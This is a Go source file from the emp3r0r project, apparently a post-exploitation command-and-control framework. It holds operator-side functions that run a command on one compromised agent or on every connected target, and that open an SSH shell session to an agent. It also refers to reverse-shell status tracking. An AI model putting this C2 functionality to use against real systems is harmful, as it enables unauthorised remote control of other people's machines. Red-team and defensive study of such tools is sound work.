//go:build linux
// +build linux

package cc

import (
	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
)

// RShellStatus stores errors from reverseBash
var RShellStatus = make(map[string]error)

// moduleCmd exec cmd on target
func moduleCmd() {
	// send command
	execOnTarget := func(target *emp3r0r_data.AgentSystemInfo) {
		if Targets[target].Conn == nil {
			CliPrintError("moduleCmd: agent %s is not connected", target.Tag)
			return
		}
		err := SendCmd(Options["cmd_to_exec"].Val, "", target)
		if err != nil {
			CliPrintError("moduleCmd: %v", err)
		}
	}

	// find target
	target := CurrentTarget
	if target == nil {
		CliPrintWarning("emp3r0r will execute `%s` on all targets this time", Options["cmd_to_exec"].Val)
		for per_target := range Targets {
			execOnTarget(per_target)
		}
		return
	}

	// write to given target's connection
	if Targets[target] == nil {
		CliPrintError("moduleCmd: agent control interface not found")
		return
	}
	execOnTarget(target)
}

// moduleShell set up an ssh session
func moduleShell() {
	// find target
	target := CurrentTarget
	if target == nil {
		CliPrintError("moduleShell: Target does not exist")
		return
	}

	// write to given target's connection
	tControl := Targets[target]
	if tControl == nil {
		CliPrintError("moduleShell: agent control interface not found")
		return
	}
	if tControl.Conn == nil {
		CliPrintError("moduleShell: agent is not connected")
		return
	}

	// options
	shell := Options["shell"].Val
	args := Options["args"].Val
	port := Options["port"].Val
	if shell == "bash" || shell == "elvish" {
		port = RuntimeConfig.SSHDShellPort
		SSHShellPort[shell] = port
	}

	// run
	err := SSHClient(shell, args, port, false)
	if err != nil {
		CliPrintError("moduleShell: %v", err)
	}
}
